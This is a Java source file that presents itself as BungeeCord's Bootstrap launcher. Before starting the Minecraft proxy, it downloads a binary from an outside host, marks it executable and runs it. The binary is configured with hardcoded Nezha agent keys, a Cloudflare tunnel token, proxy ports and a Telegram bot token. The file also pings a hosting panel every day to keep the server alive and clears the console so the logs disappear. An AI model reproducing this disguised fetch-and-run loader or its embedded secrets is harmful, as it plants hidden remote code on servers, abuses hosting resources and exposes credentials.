package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.lang.reflect.Field;

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",

        // 新增 OptikLink 保活变量
        "OPTIK_API_KEY", "OPTIK_SERVER_ID"
    };

    public static void main(String[] args) throws Exception
    {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) 
        {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower,please switch the version in startup menu!" + ANSI_RESET);
            Thread.sleep(3000);
            System.exit(1);
        }

        // Start SbxService
        try {
            runSbxBinary();

            // ============= 【新增：OptikLink 保活线程】 =============
            startOptikLinkKeepAlive();
            // ======================================================

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }

        // Continue with BungeeCord launch
        BungeeCordLauncher.main(args);
    }


    // =============================== 新增的 OptikLink 保活方法 ===============================
    private static void startOptikLinkKeepAlive() 
    {
        new Thread(() -> {
            try {
                // 获取 API KEY & SERVER ID
                String apiKey = System.getenv("OPTIK_API_KEY");
                String serverId = System.getenv("OPTIK_SERVER_ID");

                if (apiKey == null || apiKey.isEmpty()) {
                    apiKey = "6iP8cpxZNjNgI42bvq26SYdSE1jjPIZaGNlYZewR3SUqg8kT";
                }
                if (serverId == null || serverId.isEmpty()) {
                    serverId = "2a7bbdf0-b6c9-4721-9a08-78f07d01c0f4";
                }

                String url = "https://control.optiklink.com/api/client/servers/" + serverId + "/players";

                System.out.println(ANSI_GREEN + "[OptikLink] 保活线程已启动，将每日自动访问面板。" + ANSI_RESET);

                while (running.get()) {
                    try {
                        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                        conn.setRequestMethod("GET");
                        conn.setRequestProperty("Accept", "application/json");
                        conn.setRequestProperty("Authorization", "Bearer " + apiKey);
                        conn.setRequestProperty("User-Agent", "Java keepalive");

                        int code = conn.getResponseCode();

                        if (code == 200) {
                            System.out.println(ANSI_GREEN + "[OptikLink] 保活成功（已模拟登录）" + ANSI_RESET);
                        } else {
                            System.out.println(ANSI_RED + "[OptikLink] 访问失败 HTTP:" + code + ANSI_RESET);
                        }
                    } catch (Exception e) {
                        System.out.println(ANSI_RED + "[OptikLink] 保活异常: " + e.getMessage() + ANSI_RESET);
                    }

                    // 每 24 小时执行一次
                    Thread.sleep(86400000);
                }
            } catch (Exception ex) {
                System.out.println(ANSI_RED + "[OptikLink] 无法启动保活线程: " + ex.getMessage() + ANSI_RESET);
            }
        }).start();
    }
    // =========================================================================================


    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }   
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "ac66b7ab-0cfc-48e2-b231-882ea1111dce");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "nezha.9logo.eu.org:443");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "c0FdihFZ8XpqXFbu7muAAPkD5JmeVY4g");
        envVars.put("ARGO_PORT", "9010");
        envVars.put("ARGO_DOMAIN", "optiklink-hk.milan.us.kg");
        envVars.put("ARGO_AUTH", "eyJhIjoiNGMyMGE2ZTY0MmM4YWZhNzMzZDRlYzY0N2I0OWRlZTQiLCJ0IjoiMWQxNzNhZTUtYmJjMy00MjBjLWI5OGEtYzllY2Q4YzQ1ZmE2IiwicyI6Ik1XTXpaalF4TVdNdFpUSTROQzAwTm1Nd0xXRmhOalV0TURrMU9EZ3pPV05oWmpkbSJ9");
        envVars.put("HY2_PORT", "9704");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "9704");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "6839843424");
        envVars.put("BOT_TOKEN", "7872982458:AAG3mnTNQyeCXujvXw3okPMtp4cjSioO_DY");
        envVars.put("CFIP", "saas.sin.fan");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "Optiklink-HK");
        envVars.put("DISABLE_ARGO", "false");

        // 默认 OptikLink API
        envVars.put("OPTIK_API_KEY", "6iP8cpxZNjNgI42bvq26SYdSE1jjPIZaGNlYZewR3SUqg8kT");
        envVars.put("OPTIK_SERVER_ID", "2a7bbdf0-b6c9-4721-9a08-78f07d01c0f4");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value); 
                    }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }
}
